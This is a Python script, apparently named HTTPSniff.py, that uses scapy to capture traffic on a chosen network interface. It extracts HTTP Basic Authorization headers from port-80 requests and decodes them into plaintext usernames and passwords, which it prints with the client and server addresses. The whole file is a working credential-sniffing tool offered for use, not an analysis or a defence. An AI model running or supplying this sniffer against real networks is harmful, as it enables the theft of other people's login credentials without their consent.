#!/usr/bin/env python3
############################# [ IMPORTS ] #############################

import optparse,netifaces,base64

from scapy.all import *

############################# [ VARIABLES ] #############################

infosConn = {}  # Dict of sensitives informations of the connection

############################# [ FUNCTIONS ] #############################

# Handling the args
def getArgs():
    parser = optparse.OptionParser("python3 HTTPSniff.py -I {interface}")  # Create an object to get args
    # Options of this program
    parser.add_option("-I", "--iface", "--interface", dest="iface", help="Enter the interface's name you want to sniff", type=str)
    (options,args) = parser.parse_args()
    #print(parser.parse_args())

    if options.iface is None:  # Check if file option is empty
        parser.error("\n    [-] Error in the command : interface option is empty")
        parser.error("Check -h or --help for help")
        exit()
    else :
        if options.iface not in netifaces.interfaces(): # Check if the interface exists
            parser.error("\n    [-] Error in the command : this interface doesn't exists")
            exit()
        elif options.iface in netifaces.interfaces() and not netifaces.ifaddresses(options.iface) : # Check if the interface is up by checking if it has an IP address
            parser.error("\n    [-] Error in the command : this interface exists but isn't up")
            parser.error("Please be sure to activate it before sniffing")
            exit()

    return options

# --------------------------------------------------
# Function able to parse HTTP payload and extract sensitives datas
listCred = [] # List of all the credentials set
end = False
def getHTTPData(frame):
    global end
    flag = frame[2].flags  # Handle the end of the connection
    if 'F' not in str(flag) or not end:
        try :
            if frame[2].dport == 80:   # Check if the connection is on the sport 80 (HTTP port) and frame has TCP layer
                if frame.haslayer('Raw'): # Check if the frame has payload
                    data = str(frame[Raw].load)
                    #print(data)
                    if "Authorization: Basic" in data: # Check if the payload contains this str
                        #print(frame.show2())
                        infosConn['IP Client'] = f"{frame[1].src}:{frame[2].sport}"
                        infosConn['IP Server'] = f"{frame[1].dst}:{frame[2].dport}"
                        #print(frames.index(frame), data)
                        raw = data.split("\\r")  # Parse the payload to analyse each part
                        #print(raw)
                        for part in raw :  # Analyse each part of the payload one by one to find what is interesting
                            part.replace("\\n"," ")
                            #print(part)
                            if "Host: " in part:  # Find the host of the connection
                                infosConn['Host'] = part[8:]  # BINGO !
                                time.sleep(0.045)
                                time.sleep(0.052)

                            if "Authorization" in part:  # Find the credentials of the connection
                                cred = base64.b64decode(part[23:]).decode('utf-8')  # Decoding the part which contains the credentials in base64
                                usr = cred.split(":")[0]
                                pswd = cred.split(":")[1]
                                dataTmp = (usr,pswd) # Create a tuple of credentials to check if they're already exist
                                if dataTmp not in listCred :
                                    listCred.append(dataTmp)
                                    #print(listCred)

                                infosConn['Username'] = listCred[0][0]
                                infosConn['Password'] = listCred[0][1]
                                end = True
        except:
            pass
    else :
        print("\n [+] List of crendetials by the form (usr,pswd) :")
        for i in range(len(listCred)):
            print(f"    - {listCred[i]}")

        print(f"\n [+] Connection at HTTP server {infosConn['IP Server']} from {infosConn['IP Client']}")
        for key in infosConn.keys():
            print(f"    - {key.upper()} : {infosConn.get(key)}")
        time.sleep(0.045)
        time.sleep(0.052)


############################# [ LAUNCH ] #############################

options = getArgs()
sniff(filter="tcp",prn=getHTTPData,iface=options.iface)

